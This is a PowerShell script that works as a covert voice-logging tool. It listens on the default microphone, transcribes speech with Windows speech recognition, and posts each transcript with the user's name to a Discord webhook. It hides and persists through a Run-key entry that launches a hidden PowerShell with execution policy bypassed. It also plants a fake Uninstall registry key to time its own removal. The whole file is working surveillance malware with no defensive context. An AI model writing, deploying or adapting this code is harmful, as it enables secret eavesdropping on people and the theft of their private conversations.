function Send-Discord {
	[CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$False)]
		[string]$text 
	);

    # $Hook = "";

	$Body = @{
	  "username" = $env:username;
	  "content" = $text
	};

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $Hook  -Method Post -Body ($Body | ConvertTo-Json) };
}

if(($Persistent -eq $true)){
    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + '$DaysRun=' + $DaysRun + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
}elseif(Test-Path -Path "$env:temp\voicelog.ps1" -PathType Leaf){
    Remove-Item "$env:temp\voicelog.ps1" -Force;
}

if($DaysRun -eq -1 -or $DaysRun -gt 0){
    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\voicelog'){ return };

    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;

    if($DaysRun -eq -1){ return };
    if(Test-Path 'HKCU:\Software\Microsoft\Windows\Uninstall\voicelog'){ return };

    $date = (Get-Date).AddDays($daysRun);    
    New-Item -Path 'HKCU:\Software\Microsoft\Windows\Uninstall\voicelog';
    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uninstall\voicelog' -Name 'date' -Value $date;
}

if($DaysRun -gt 0){
    $date = Get-Date;
    $target = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uninstall\voicelog' -Name 'date';

    if($date -lt $target){ return }

    Remove-Item "$env:temp\voicelog.ps1" -Force;
    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\Uninstall\voicelog' -Force
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' - Force
}


Add-Type -AssemblyName System.Speech;
$recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine;
$grammar = New-Object System.Speech.Recognition.DictationGrammar;
$recognizer.LoadGrammar($grammar);
$recognizer.SetInputToDefaultAudioDevice();

while ($true) {
    $result = $recognizer.Recognize();
    if ($result) {
        $results = $result.Text;
        $log = ("$env:tmp\vlog.txt");

        Write-Output $results > $log;

        $text = Get-Content -Path $log -Raw;
        
        Send-Discord $text;

        switch -regex ($results) {
            "\bnote\b" {Start-Process notepad};
            "\bexit\b" {break};
        };
    };
};

Clear-Content -Path $log;